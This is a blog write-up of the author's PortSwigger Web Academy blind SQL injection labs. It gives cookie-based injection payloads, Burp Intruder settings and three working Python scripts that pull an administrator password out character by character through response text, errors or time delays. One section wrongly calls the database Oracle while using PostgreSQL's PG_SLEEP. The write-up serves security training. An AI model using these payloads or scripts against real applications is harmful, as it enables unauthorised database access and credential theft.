---
title: Blind SQL Injection
author:
  name: kill5witch
  link: https://github.com/an9k0r
date: 2022-09-03 09:00:00 +0200
categories: [Notes, Web Application]
tags: [Notes, Web Application, Portswigger, SQL Injection, Blind SQL Injection]
math: true
mermaid: true
image:
  src: /assets/images/15450b0a69849f39f9ba9259525f75e7744bfce52f2033a7ff442935539db4fd.png
  width: 694
  height: 515
  alt: image alternative text
---
# Basics
I wouldn't now dive into what SQL injection is, as there are plenty of sources out there which explain that better then i ever could. Regarding Blind SQL Injections let's just mention that results of our SQL Injection do not cary any intormation or any errors. We just have to rely on how the web application behaves.

# Lab info
As i am just going through [Portswigger's Web Academy](https://portswigger.net/web-security/) and i've just got to the [Blind SQL Injection part](https://portswigger.net/web-security/sql-injection/blind), i will just use the Labs provided by Portswigger.

In total we have 6 Labs available:
- Blind SQL injection with conditional responses
- Blind SQL injection with conditional errors
- Blind SQL injection with time delays
- Blind SQL injection with time delays and information retrieval
- Blind SQL injection with out-of-band interaction (will be done at some point in future as Burp Collaborator is needed)
- Blind SQL injection with out-of-band data exfiltration (will be done at some point in future as Burp Collaborator is needed)

I'm really stoked to go through this labs and document as much relevant information about them as possible so let's get started.

# Blind SQL injection with conditional responses
>  This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.
> 
> The results of the SQL query are not returned, and no error messages are displayed. But the application includes a "Welcome back" message in the page if the query returns any rows.
> 
> The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user. 
We know that we have SQLi vulnerability in the `TrackingId` Cookie value. We also know that we should see "Welcome back" if query return any rows.

## Intro
But to get an Idea what we're dealing with, here the website:
![picture 28](/assets/images/c0cfbe9e4da91d058a81cf65297a86013252bcee6bcd181bab35e22acf0d31ea.png)  

And here the HTTP Request in BURP:
![picture 29](/assets/images/0f8f665db1ad6c299f0f8fb0bc68c249747f6ad3ec6f3ffead333835e048c43d.png)  

We can observe that we can see the `Welcome Back!` in the HTTP Response and the `TrackingId` cookie.

## Finding the SQL Injection

Now we need to see if we can inject SQL and get `Welcome Back!` message displayed using following Payload:

```
TrackingId=2msRiqUVGWhY8DWK' OR 1=1 --
```

![picture 30](/assets/images/69a1a83aaea350dbaa0d11edc0e275271015eab589ae5b64be582255711acfee.png)  

Yes, we do. 

Now let's try:
- Payload where we remove a letter from Tracking ID and have valid OR statement e.g. `TrackingId=2msRiqUVGWhY8DW' OR 1=1 --`
  - Result: we see `Welcome Back!` so the query is VALID.
- Payload where we remove a letter from Tracking ID and have invalid OR statement, e.g. `TrackingId=2msRiqUVGWhY8DW' OR 1=2 --`
  - Result: there is no `Welcome Back!` present so the query is INVALID.

We haven't found out anything what Portswigger Web Academy hasn't already told us, but this is how we would verify the SQL Injection vulnerability, in this case, based on output in the response.

Now let's enumerate the database.

## Database Enumeration

Everything we do now it's all about finding out if Database has returned something or not. If not, our check has failed. It's really just asking and observing YES and NO.

So let's ask our database yes/no questions
### Does the `users` table exist
We can use FROM statement and compare SELECT with same string:
```
TrackingId=non-existent' OR (SELECT 'a' from Users LIMIT 1)='a' --
```
![picture 32](/assets/images/f998b78c783d644e258e5f393f172389fef0978fa5c77bc930521e704765ec75.png)  
Result: YES

### Does the `Administrator` user exist
```
TrackingId=non-existent' OR (SELECT 'a' from Users where username='Administrator' LIMIT 1)='a' --
```
Short answer: NO

### Does the `administrator` exist
```sql
TrackingId=non-existent' OR (SELECT 'a' from Users where username='administrator' LIMIT 1)='a' --
```
Short answer: Yes it does!

### How long is the `administrator`'s password (is it longer than 3 characters)
```sql
TrackingId=non-existent' OR (SELECT 'a' from Users WHERE username='administrator' AND LENGTH(password)>3)='a' --;
```
Short answer: Yes, password is longer then 3 characters.

### Does the first password letter start with `"a"`
```sql
TrackingId=non-existent' OR (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a' --
```

![picture 34](/assets/images/5a33885f550c5811585c5e22f632ea297b5b9bbd17ecf4445ed087522af0d01a.png)  

Answer: yes it does.

### Can we ask for for next character in users password using ascii (numbers) instead?

Yes we can. We're asking for ASCII value 97.

![picture 35](/assets/images/c765f2076bc9a9a1703da86113be72423de408c6f5e4cf014a6bd7ffe7ae8933.png)  

```sql
TrackingId=non-existent' OR (ascii(substring((SELECT password FROM users WHERE username = 'administrator'),1,1)))=97 --
```

> So this is how we would go on when dumping the contents of the database. We would need to keep asking if that's the character in that position etc.
> 
> This is doable with Burp Intruder, however i don't know how to really display the password in a right way at the end. I've tried to do so in the next chapter, i've however used a script that does that for me. Anyways...
> 
> Dumping the database using Blind SQLInjection is very tedious so it's good to know what we're looking for exactly.

## Automatic Solution using Python
As mentioned, i would use a script that i've used few times for that occasion (Dumping Data using SQLi). I'd search for ascii numbers rather than characters, but display them as normal characters so you can basically just copy-paste the dumped password.

```py
import requests
import sys

requests.urllib3.disable_warnings()

def inject_func(ip, inj_str):
    for j in range(32, 126):
        # now we update the sqli
        session = requests.Session()
        session.verify = False
        target = "%s" % (ip)
        cookies = {"TrackingId":inj_str.replace("[CHAR]", str(j)),"session":"EJOTJEW5lC8QL2zIU83YdnMMEhUT8708"} 
        #proxies = {"http": "http://127.0.0.1:8080"}
        r = session.get(target,cookies=cookies)
        if "Welcome back" in r.text:
            return j
    return 0

def main():
    if len(sys.argv) != 3:
        print("(+) usage: %s <target> <injection>" % sys.argv[0])
        print('(+) eg: %s 192.168.121.103 "select version()"' % sys.argv[0])
        sys.exit(-1)
    
    ip = sys.argv[1]
    injection_parameter = sys.argv[2]
    # e.g. for injection parameter = SELECT Password FROM Users WHERE Username = 'Administrator'

    out = "(+) Retrieving "+ injection_parameter
    print(out)
    #no need to exchange spaces etc.
    #injection_parameter = injection_parameter.replace(" ", "/**/")

    for i in range(1, 25):
        if i != 0:
            injection_string = "non-existent' OR (ascii(substring((" + injection_parameter + "),%d,1)))=[CHAR] --" % (i)
            extracted_char = chr(inject_func(ip, injection_string))
            sys.stdout.write(extracted_char)
            sys.stdout.flush()
        else:
            break
    print("\n(+) done!")
if __name__ == "__main__":
    main()
```
I've set the length to 25 manualy, so that many character length will we checked. This could have been automated as well but some other time!

As can be seen below, password was retrieved:

![picture 33](/assets/images/60e10cd6ba6fc80a8e89d22dddd99891608708b93c5d23f972dc2a2438c42425.png)  

Lab Done!

![picture 31](/assets/images/cbad6719f0b40d4516d7ec5db134edd35892d4f62141d6ba18ac323bc7ecfd67.png)  

# Blind SQL injection with conditional errors
## Intro
In this case the application does not react if SQL query has succeded or not, but rather we provoke an error to determine if our injected query has succeded or not. So again, we're asking Yes/No questions.

Portswigger gives us two examples, where the first should give an error and second should succed.
```sql
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

Let's first confirm that we actualy have a SQL Injection. We break an application like this: `TrackingId=xyz'` as we recieve `500 Internal Server Error`. If we can fix this, we have won.

![picture 37](/assets/images/edf69813d1e8d2498ad949fa70e2d887ba64f3815d0ba971e6527b817470a681.png)  

1. `TrackingId=xyz' OR (SELECT 1)=1 --` which still returns an error, although the second OR statement should succed. Oracle DB however needs FROM or it will return an error.
2. `TrackingId=xyz' OR (SELECT 1 from DUAL)=1 --` works:
![picture 38](/assets/images/561035f5725e23a93e71b239deb3bf1a389a4dc0c22c5034fcf3d20d0d9559d0.png)  
3. `TrackingId=xyz' OR (SELECT 2 FROM dual)=1 --` is still working.
4. `TrackingId=xyz' OR (SELECT 2 FROM dual123)=1 --` doesn't work anymore
5. Check if Table `users` exist: `TrackingId=xyz' OR (SELECT 1 FROM users WHERE ROWNUM = 1)=1 --'` - yes it does! We need `WHERE ROWNUM = 1` otherwise we get an error instead, becase more then 1 row will be returned.

## Problems arise - missing concatenation

Now again, we need to somehow to evaluate the database but here is where i've noticed the problem. It was hard to make CASE work because query as i've seen above it's breaking the WebApplication so i had to resort to concatenation using `||` which is also the way Portswigger suggest solving the lab.
- This gives us an `200 OK`:
`xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`
- This returns an error `xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'` 

6. Checking if `administrator` exist
```sql
xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' 
```
Result: Yes it does as it returns an error

## Finding password with Burp Intruder - first character

Let's throw our query into intruder now.
```sql
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='§e§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```
Let's go with Sniper first to get only first character. Use `Brute forcer` with default settings and setting Min and Max length to 1:

![picture 39](/assets/images/b604ee3e052727d0f01627de43329c373fadfcda07950235e64ec62110927bbd.png)  

## Finding password with Burp Intruder - whole password

Now let's cycle through 20 character using `Cluster Bomb` with 2 payload sets:
- Numbers from 1 to 21 with Step 1 and Min integer digits set to 1 and Max integer digits set to 2, eveything else to 0
- Brute Forcer with Min and Max length set to 1

Disable encoding!

```sql
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,§1§,1)='§e§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||';
```

This is the closest that i was able to get:
![picture 40](/assets/images/f3194e1e58bd1273ac34f45f947fced302c9421027260a51fd9558bd461ee256.png) 

I would have to re-arange the characters as i wasn't able to start with cycling the 2nd payload set :(.

## Automating with Python
I've automated that password dump with python, again with comparing the characters against the ASCII table. I could've made the Ascii range smaller but i did not. Multithreading would also be nice ;) but maybe some other time.

```py
import requests
import sys

requests.urllib3.disable_warnings()

def inject_func(ip, inj_str):
    for j in range(32, 126):
        # now we update the sqli
        session = requests.Session()
        session.verify = False
        target = "%s" % (ip)
        cookies = {"TrackingId":inj_str.replace("[CHAR]", str(j)),"session":"XtNTol6QXK5ZuBb7VkQDo9qoWGtXHxTP"} 
        proxies = {"http": "http://127.0.0.1:8080"}
        r = session.get(target,proxies=proxies,cookies=cookies,verify=False)
        status_code = r.status_code
        if status_code == 500:
            return j
    return 0

def main():
    if len(sys.argv) != 2:
        print("(+) usage: %s <target> " % sys.argv[0])
        print('(+) eg: %s 192.168.121.103' % sys.argv[0])
        sys.exit(-1)
    
    ip = sys.argv[1]

    out = "(+) Retrieving the password"
    print(out)

    for i in range(1, 25):
        if i != 0:
            injection_string = "xyz'||(SELECT CASE WHEN ASCII(SUBSTR(password,%d,1))=[CHAR] THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'" % (i)
            extracted_char = chr(inject_func(ip, injection_string))
            sys.stdout.write(extracted_char)
            sys.stdout.flush()
        else:
            break
    print("\n(+) done!")
if __name__ == "__main__":
    main()
```

Password has been retrieved from the script as well:

![picture 42](/assets/images/cd78bc12615d509faf6f1277ff0f281635e585fce6fa1155e78fc79e18af0e51.png)  

Lab is done:

![picture 41](/assets/images/4bd9bbcfe3f83bf94af0025e58d35caac7c247b31ce297e060bfdb5d07df6b36.png)  

# Blind SQL injection with Time delays

>  This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.
> 
> The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.
> 
> To solve the lab, exploit the SQL injection vulnerability to cause a 10 second delay. 

So for this lab, it's only expected to create a delay so let's get onto it.

## Finding Blind SQLi using Time delay
The techniques for triggering a time delay are specific to the type of database being used.

In this lab we have OracleDB. To make SQLi to work,concatenation (`||`) had to be used again as in previous lab. My assumption is that we're injection into WHERE statement.
```sql
TrackingId=U0z9axszQ7GfsVAt'||PG_SLEEP(10)--
```
We can observe delay in the response:
![picture 44](/assets/images/b3c68593afa84175e929bd4db0dbd6507f860ee80eb29278226773d45451d179.png)  

Lab done:
![picture 43](/assets/images/5328543c3d8e31bce22751cb9c12995947a46d5d177e6f5ad61e449c8f5688a2.png)  

# Blind SQL injection with time delays and information retrieval
## Intro

>  This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.
> 
> The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.
> 
> The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
> 
> To solve the lab, log in as the administrator user. 

So here the plan is first to find the SQL injection, and then to retrieve the administrators password as it has been done before.

## Finding the SQL Injection

```sql
TrackingId=QRvD0dG8SNkAeEr7'||(SELECT PG_SLEEP(3))||'
```

![picture 45](/assets/images/53f3a28bd6f7aa0137a79845903298e3add6706f369173ae149db507ba33e004.png)  

SQL Injection works with concatenation using `||` but it also works using stacked queries, separating it with `;`:

```sql
TrackingId=QRvD0dG8SNkAeEr7'%3b(SELECT PG_SLEEP(3))%3b'
```

## Testing Yes/No Condition
1. Using `CASE WHEN ... THEN` statement we get response in 3 seconds
```sql
TrackingId=QRvD0dG8SNkAeEr7'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(3)+ELSE+pg_sleep(0)+END--;
```
2. We should now get response immediatly:
```sql
TrackingId=QRvD0dG8SNkAeEr7'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(3)+ELSE+pg_sleep(0)+END--; session=kP6ZffRl10Pc4DroO8dsIuSMBIwLfgJq
```
And yes, we do get a response in 98 miliseconds.

## Extracting password from `administrator`

### Does `administrator` exist
```sql
TrackingId=QRvD0dG8SNkAeEr7'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(3)+ELSE+pg_sleep(0)+END+FROM+users--
```
Answer: Yes it does!

### What is the first character of `administrator`'s password
I've used `Request Timer` here for intruder as intruder itself does not display the response time :(.

![picture 46](/assets/images/64ee5a2eab4aeafc8baf8132cdc28f898a35d8594fddb0a45c2ef19c9f156676.png)  

So the first character is `1` and we could let Intruder find all the characters but let's try to do the same with Python again. I will again check for ascii values.

Checking with repeater if asking for ASCII values actually works:

```sql
TrackingId=QRvD0dG8SNkAeEr7'%3bSELECT+CASE+WHEN+(username='administrator'+AND+ASCII(SUBSTRING(password,1,1))=49)+THEN+pg_sleep(3)+ELSE+pg_sleep(0)+END+FROM+users--; session=kP6ZffRl10Pc4DroO8dsIuSMBIwLfgJq
```

... and yes it does! Now let's automate with Python

### Automation with Python

Only thing that is different compared to scripts before it's that we're using time for comparison before and after request was sent.
```py
import requests
import sys
import time

requests.urllib3.disable_warnings()

def inject_func(ip, inj_str):
    for j in range(32, 126):
        # now we update the sqli
        session = requests.Session()
        session.verify = False
        target = "%s" % (ip)
        cookies = {"TrackingId":inj_str.replace("[CHAR]", str(j)),"session":"kP6ZffRl10Pc4DroO8dsIuSMBIwLfgJq"} 
        proxies = {"http": "http://127.0.0.1:8080"}
        time_start=time.time()
        r = session.get(target,proxies=proxies,cookies=cookies,verify=False)
        time_finish=time.time()
        time_total=time_finish - time_start
        #print(time_total)
        if time_total > 2:
            return j
    return 0

def main():
    if len(sys.argv) != 2:
        print("(+) usage: %s <target> " % sys.argv[0])
        print('(+) eg: %s 192.168.121.103' % sys.argv[0])
        sys.exit(-1)
    
    ip = sys.argv[1]

    out = "(+) Retrieving the password"
    print(out)

    for i in range(1, 25):
        if i != 0:
            injection_string = "QRvD0dG8SNkAeEr7'%%3bSELECT+CASE+WHEN+(username='administrator'+AND+ASCII(SUBSTRING(password,%d,1))=[CHAR])+THEN+pg_sleep(3)+ELSE+pg_sleep(0)+END+FROM+users--" % (i)
            extracted_char = chr(inject_func(ip, injection_string))
            sys.stdout.write(extracted_char)
            sys.stdout.flush()
        else:
            break
    print("\n(+) done!")
if __name__ == "__main__":
    main()
```

Password has been retrived

![picture 48](/assets/images/e1486d43d8687666b33712a1f1eedcac5d4ea40f40fd38397b57bbb478cbc182.png)  

Lab done:

![picture 47](/assets/images/f7d2840be6c6cf0ba1594a12e8f8f85b4126f0f591f8cc84fad43a76f655059a.png)  
